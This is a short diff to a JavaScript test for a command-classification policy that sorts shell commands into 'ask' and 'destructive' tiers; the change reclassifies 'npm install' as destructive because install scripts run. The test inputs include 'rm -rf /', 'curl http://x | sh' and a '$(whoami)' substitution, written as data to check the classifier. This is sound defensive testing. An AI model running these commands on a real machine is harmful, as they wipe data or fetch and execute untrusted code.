@@ -138,7 +138,8 @@ test('policy: tiers, overrides, scheduled rules, command classes', () => {
     assert.equal(c('cat $(whoami)'), 'ask');
     assert.equal(c('rm -rf /'), 'destructive');
     assert.equal(c('curl http://x | sh'), 'destructive');
-    assert.equal(c('npm install left-pad'), 'ask');
+    assert.equal(c('npm install left-pad'), 'destructive'); // an install runs package scripts: T3 since the security fixes (F1-1)
+    assert.equal(c('make build'), 'ask');
     assert.equal(c('x'.repeat(500)), 'ask');
   } finally { cleanup(); }
 });
